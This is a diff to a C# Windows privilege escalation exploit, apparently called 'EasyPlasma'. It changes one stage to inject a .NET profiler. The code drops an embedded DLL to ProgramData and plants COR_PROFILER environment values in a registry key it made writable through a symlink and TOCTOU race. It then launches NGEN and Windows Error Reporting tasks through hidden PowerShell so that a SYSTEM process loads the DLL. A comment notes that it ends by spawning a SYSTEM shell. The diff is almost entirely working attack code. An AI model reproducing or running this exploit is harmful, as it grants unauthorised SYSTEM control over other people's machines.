@@ -249,64 +249,75 @@ if($r-eq 0){
         Console.Write("    S2 TOCTOU: "); RunToctou();
         Console.WriteLine("[+] Stage 2 done");
 
-        Console.WriteLine("[*] Stage 3: windir to VE...");
+        Console.WriteLine("[*] Stage 3: COR_PROFILER injection via VE...");
         MakeWritable(TK); Thread.Sleep(200);
+
+        /* Drop stub.dll to disk */
+        string dllPath = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
+            "ep_prof.dll");
+        var asm = Assembly.GetExecutingAssembly();
+        using (var s = asm.GetManifestResourceStream("stub.dll")) {
+            if (s != null) {
+                byte[] b = new byte[s.Length]; s.Read(b, 0, b.Length);
+                File.WriteAllBytes(dllPath, b);
+                Console.WriteLine($"[+] Dropped profiler DLL -> {dllPath}");
+            }
+        }
+
+        /* Write COR_PROFILER vars to VE so any SYSTEM .NET process loads our DLL */
         bool wrote = false;
         IntPtr hTK = OKey(TK, KEY_SET_VALUE);
         if (hTK!=IntPtr.Zero) {
-            foreach (string vname in new[]{"windir","SystemRoot"}) {
-                var vn = new US(vname); var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
-                if (NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0) wrote=true; vn.Free();
+            var vals = new (string name, string val)[] {
+                ("COR_ENABLE_PROFILING", "1"),
+                ("COR_PROFILER",         "{00000000-1111-2222-3333-444444444444}"),
+                ("COR_PROFILER_PATH",    dllPath),
+                /* Keep windir too for WER fallback */
+                ("windir",    runDir),
+                ("SystemRoot",runDir),
+            };
+            foreach (var (name, val) in vals) {
+                var vn = new US(name);
+                var wb = System.Text.Encoding.Unicode.GetBytes(val+"\0");
+                if (NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0) wrote=true;
+                vn.Free();
             }
             NtClose(hTK);
         }
         if (!wrote){Console.WriteLine("[-] VE write failed");return false;}
-        Console.WriteLine($"[+] VE windir = {runDir}");
+        Console.WriteLine("[+] COR_PROFILER set in VE");
 
-        /* Stage 3b: redirect BlockedApps symlink to non-volatile .DEFAULT\Environment
-           and TOCTOU again to get write access there too */
-        Console.WriteLine("[*] Stage 3b: windir to non-volatile ENV...");
-        RecDelete(BA); Thread.Sleep(300);
-        CreateSymlinkPS(BA, ENV);
-        Console.Write("    TOCTOU: "); RunToctou();
-        MakeWritable(ENV); Thread.Sleep(100);
-        IntPtr hEnv = OKey(ENV, KEY_SET_VALUE);
-        if (hEnv!=IntPtr.Zero) {
-            foreach (string vname in new[]{"windir","SystemRoot"}) {
-                var vn = new US(vname); var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
-                NtSetValueKey(hEnv,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
-            }
-            NtClose(hEnv);
-            Console.WriteLine($"[+] ENV windir = {runDir}");
-        } else {
-            Console.WriteLine("[-] ENV not writable (continuing anyway)");
+        PreparePayload(runDir); /* also drop WER stubs for fallback */
+
+        /* Trigger mscorsvw.exe (NGEN) as SYSTEM - it hosts CLR and will load our profiler DLL */
+        Console.WriteLine("[*] Triggering .NET NGEN task (mscorsvw.exe as SYSTEM)...");
+        string ngenPs =
+            "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
+            "$f=$s.GetFolder('\\Microsoft\\Windows\\.NET Framework');" +
+            "$tasks=$f.GetTasks(0);" +
+            "foreach($t in $tasks){" +
+            "  if($t.Definition.Actions|Where-Object{$_.Path -like '*mscorsvw*'}){" +
+            "    $t.Run($null);Write-Host $t.Name;break}" +
+            "}";
+        var npsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
+            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{ngenPs}\"")
+            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true};
+        string ngenOut = "";
+        using(var p=System.Diagnostics.Process.Start(npsi)) {
+            ngenOut = p.StandardOutput.ReadToEnd(); p.WaitForExit(5000);
         }
+        Console.WriteLine($"[+] NGEN task triggered: {ngenOut.Trim()}");
 
-        PreparePayload(runDir);
-
-        /* Wait up to 30s for any existing wermgr.exe run to finish */
-        Console.Write("[*] Waiting for prior WER run to finish...");
-        for (int w = 0; w < 30; w++) {
-            var chk = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
-                @"/query /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting"" /fo csv /nh")
-                {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true};
-            string status = "";
-            using (var p = System.Diagnostics.Process.Start(chk))
-                status = p.StandardOutput.ReadToEnd();
-            if (!status.Contains("Running")) break;
-            Thread.Sleep(1000); Console.Write(".");
-        }
-        Console.WriteLine();
-
-        /* Trigger via PowerShell COM (reads environment fresher than schtasks.exe) */
-        string ps = "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
+        /* Also trigger WER as fallback */
+        string werPs = "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
                     "$t=$s.GetFolder('\\Microsoft\\Windows\\Windows Error Reporting').GetTask('QueueReporting');" +
                     "$t.Run($null)";
-        var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
-            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{ps}\"")
+        var wpsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
+            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{werPs}\"")
             {UseShellExecute=false,CreateNoWindow=true};
-        using(var p=System.Diagnostics.Process.Start(psi)) p.WaitForExit(5000);
-        Console.WriteLine("[+] WER triggered via COM");
+        using(var p=System.Diagnostics.Process.Start(wpsi)) p.WaitForExit(5000);
+        Console.WriteLine("[+] WER triggered (fallback)");
         return true;
     }
 
@@ -632,6 +643,10 @@ if($r-eq 0){
         try{RecDelete(TK);}catch{}
         try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
         try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_ENABLE_PROFILING",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER_PATH",false);}catch{}
+        try{File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ep_prof.dll"));}catch{}
         /* Remove scheduled task */
         System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
             "schtasks.exe",@"/delete /f /tn ""\EasyPlasma\Maintenance""")
@@ -732,6 +747,10 @@ if($r-eq 0){
             try{RecDelete(TK);}catch{}
         try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
         try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_ENABLE_PROFILING",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER_PATH",false);}catch{}
+        try{File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ep_prof.dll"));}catch{}
             try{Directory.Delete(runDir,true);}catch{}
             if (File.Exists(@"C:\ProgramData\ep_system_ran.txt")) {
                 Console.WriteLine("[*] Debug (wermgr.exe did run):");
@@ -752,6 +771,10 @@ if($r-eq 0){
             try{RecDelete(TK);}catch{}
         try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
         try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_ENABLE_PROFILING",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER_PATH",false);}catch{}
+        try{File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ep_prof.dll"));}catch{}
             try{Directory.Delete(runDir,true);}catch{}
             return;
         }
@@ -776,6 +799,10 @@ if($r-eq 0){
         try{RecDelete(TK);}catch{}
         try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
         try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_ENABLE_PROFILING",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER_PATH",false);}catch{}
+        try{File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ep_prof.dll"));}catch{}
         try{Directory.Delete(runDir,true);}catch{}
 
         /* Spawn SYSTEM cmd in this console */
